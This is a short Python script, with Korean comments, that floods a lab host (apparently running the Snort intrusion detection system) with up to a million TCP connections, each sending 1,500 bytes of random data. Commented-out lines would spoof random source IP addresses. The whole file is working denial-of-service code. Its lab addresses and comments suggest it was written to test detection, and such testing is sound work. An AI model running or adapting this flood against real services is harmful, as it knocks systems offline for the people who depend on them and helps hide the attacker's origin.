import socket as sk
from scapy.all import * # 출발지 ip 변경, apt install python3-pip, pip install scapy
import random
import string

# snort : 192.168.209.128
# dos : 192.168.209.129

# target
target_host = "192.168.209.128"
target_port = 8080
window_size = 1500 # MTU = 1500

def generate_dummy_data(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# source ip
for i in range(1000000):
    # src_ip = f'192.168.{random.randint(0, 255)}.{random.randint(0, 255)}'
    client = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
    data = generate_dummy_data(1500)
    # data = generate_dummy_data(1500)

    try:
        client.settimeout(1000)
        # client.bind((src_ip, 0))
        client.connect((target_host, target_port))
        client.send(data.encode())
        # print(f'연결 성공 : 출발지 ip 주소 : {src_ip}')
        print(f'연결 성공: {i}')
    except sk.error as e:
        print(f'연결 실패: {e}')

    finally:
        client.close()
